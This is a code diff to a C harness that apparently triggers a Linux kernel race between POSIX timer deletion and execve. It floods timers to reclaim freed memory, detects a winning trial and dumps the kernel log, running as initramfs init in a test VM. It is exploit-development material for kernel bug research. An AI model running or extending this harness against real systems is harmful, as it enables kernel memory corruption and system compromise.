@@ -76,7 +76,6 @@ struct race_shm {
 	uint32_t go;		/* child's exec thread is entering execve */
 	uint32_t stage_b;	/* parent wants the churning phase2 */
 	uint32_t near;		/* arm a short (near) expiry this trial */
-	uint32_t flood;		/* parent saw del_shnull rise: this trial won */
 };
 
 static struct race_shm *shm;
@@ -523,10 +522,14 @@ static void phase2(unsigned long iter, unsigned mode, uint64_t t_go)
 
 		for (int i = 0; i < FLOOD_TIMERS; i++)
 			ft[i] = (timer_t)-1;
+		memset(&sev, 0, sizeof(sev));
+		sev.sigev_notify = SIGEV_SIGNAL;
+		sev.sigev_signo = RECLAIM_SIG;
 		memset(&its, 0, sizeof(its));
-		its.it_value.tv_nsec = 1;
+		its.it_value.tv_nsec = 1;	/* absolute past: expires = 1 */
 		for (int i = 0; i < FLOOD_TIMERS; i++) {
-			if (timer_create(CLOCK_MONOTONIC, &sev, &ft[i]))
+			if (timer_create(CLOCK_MONOTONIC, &sev, &ft[i]) ||
+			    timer_settime(ft[i], TIMER_ABSTIME, &its, NULL))
 				anomalies++;
 			else
 				armed++;
@@ -753,8 +756,10 @@ static int parent_trial(long iter, uint64_t delay_ns, int near, int stage_b,
 		return -1;
 	}
 	if (pid == 0) {
-		dup2(g_trig_pipe[0], 4);
-		close(g_trig_pipe[0]);
+		if (g_trig_pipe[0] != 4) {
+			dup2(g_trig_pipe[0], 4);
+			close(g_trig_pipe[0]);
+		}
 		close(g_trig_pipe[1]);
 		racing_child(iter);
 		_exit(1);
@@ -918,17 +923,9 @@ static int parent_trial(long iter, uint64_t delay_ns, int near, int stage_b,
 				}
 			}
 		}
-		g_alarm_fired = 0;
-		alarm(3);
-		int st;
-
-		while (waitpid(pid, &st, 0) < 0 && errno == EINTR)
-			;
-		alarm(0);
-		g_child_pid = -1;
-		if (g_alarm_fired)
-			emit("WATCHDOG iter=%ld\n", iter);
-		return 0;
+		/* Fall through to the shared win-detect/reap tail: the
+		 * flood trigger must be reachable in the modes where the
+		 * dangerous delete actually runs. */
 	} else if (mode == MODE_CASCADE) {
 		/*
 		 * Calibrated delete cascade: place CASCADE_TIMERS independent
@@ -961,7 +958,6 @@ static int parent_trial(long iter, uint64_t delay_ns, int near, int stage_b,
 	 * silent once-per-boot repeat). The reader thread counts events
 	 * with up to ~20ms latency, so keep re-checking while the child's
 	 * quiet spin is still running and flag it for the refill flood. */
-	atomic_store_explicit(&shm->flood, 0, memory_order_release);
 	g_alarm_fired = 0;
 	alarm(3);
 	int st;
@@ -1090,7 +1086,20 @@ static void dump_klog_tail(void)
 	if (n <= 0)
 		return;
 	buf[n] = '\0';
-	emit("--- klog tail ---\n%s--- klog end ---\n", buf);
+	/* Written directly: emit()'s buffer would truncate a 32KB tail to
+	 * its first line. */
+	if (write(MARKER_FD, "--- klog tail ---\n", 18) < 0) {
+	}
+	if (write(STDOUT_FILENO, "--- klog tail ---\n", 18) < 0) {
+	}
+	if (write(MARKER_FD, buf, (size_t)n) < 0) {
+	}
+	if (write(STDOUT_FILENO, buf, (size_t)n) < 0) {
+	}
+	if (write(MARKER_FD, "--- klog end ---\n", 16) < 0) {
+	}
+	if (write(STDOUT_FILENO, "--- klog end ---\n", 16) < 0) {
+	}
 }
 
 static void lift_rlimits(void)
@@ -1105,6 +1114,24 @@ int main(int argc, char **argv)
 {
 	g_self = argv[0];
 
+	/* The trigger pipe must never hold fd 3 (the marker fd) or fd 4
+	 * (the child's trigger reader): allocate both ends well above the
+	 * fixed descriptors; F_DUPFD picks free fds so it cannot collide. */
+	if (pipe(g_trig_pipe)) {
+		emit("PIPE_FAIL errno=%d\n", errno);
+		return 2;
+	}
+	for (int end = 0; end < 2; end++) {
+		int moved = fcntl(g_trig_pipe[end], F_DUPFD, 16);
+
+		if (moved < 0) {
+			emit("PIPE_MOVE_FAIL errno=%d\n", errno);
+			return 2;
+		}
+		close(g_trig_pipe[end]);
+		g_trig_pipe[end] = moved;
+	}
+
 	if (argc >= 2 && !strcmp(argv[1], "phase2")) {
 		long iter = argc >= 3 ? strtol(argv[2], NULL, 10) : -1;
 		unsigned mode = argc >= 4 ? (unsigned)strtoul(argv[3], NULL, 10) : 0;
@@ -1118,10 +1145,6 @@ int main(int argc, char **argv)
 	signal(SIGALRM, on_alarm);
 	g_child_pid = -1;
 
-	if (pipe(g_trig_pipe)) {
-		emit("PIPE_FAIL errno=%d\n", errno);
-		return 2;
-	}
 	shm = mmap(NULL, sizeof(*shm), PROT_READ | PROT_WRITE,
 		   MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 	if (shm == MAP_FAILED) {
@@ -1130,7 +1153,9 @@ int main(int argc, char **argv)
 	}
 
 	if (getpid() == 1) {
-		/* initramfs /init: set up the marker fd, run, power off. */
+		/* initramfs /init: the marker fd must be allocated before the
+		 * trigger pipe, otherwise pipe() takes fd 3 and this dup2
+		 * would clobber its read end. */
 		int mfd = open("/markers", O_CREAT | O_WRONLY | O_APPEND, 0600);
 
 		if (mfd >= 0 && mfd != MARKER_FD) {
